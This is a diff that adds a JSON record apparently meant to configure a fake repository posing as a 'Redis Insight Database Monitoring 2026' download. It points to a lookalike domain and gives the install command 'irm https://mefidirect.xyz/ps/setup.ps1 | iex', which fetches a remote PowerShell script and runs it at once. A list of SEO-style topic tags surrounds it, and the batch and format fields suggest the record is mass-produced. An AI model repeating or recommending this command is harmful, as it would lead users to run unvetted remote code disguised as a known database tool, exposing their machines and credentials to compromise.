@@ -1,0 +1,29 @@
+{
+  "repo": "redis-insight-database-monitoring-2026",
+  "product": "Redis Insight Database Monitoring 2026",
+  "kind": "database",
+  "install_type": "download",
+  "download_url": "https://redis-insight.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "database",
+  "topics": [
+    "redis-insight-bundle",
+    "redis-insight-platform",
+    "redis-insight-database-client",
+    "redis-insight-64-bit",
+    "redis-insight-startup-fix",
+    "redis-insight-pc-install",
+    "redis-insight-sql-workbench",
+    "redis-insight-workbench",
+    "redis-insight-user-guide",
+    "redis-insight-manual-2026",
+    "redis-insight-installer",
+    "database-tools",
+    "windows-tools",
+    "desktop-tools",
+    "setup-guide"
+  ]
+}
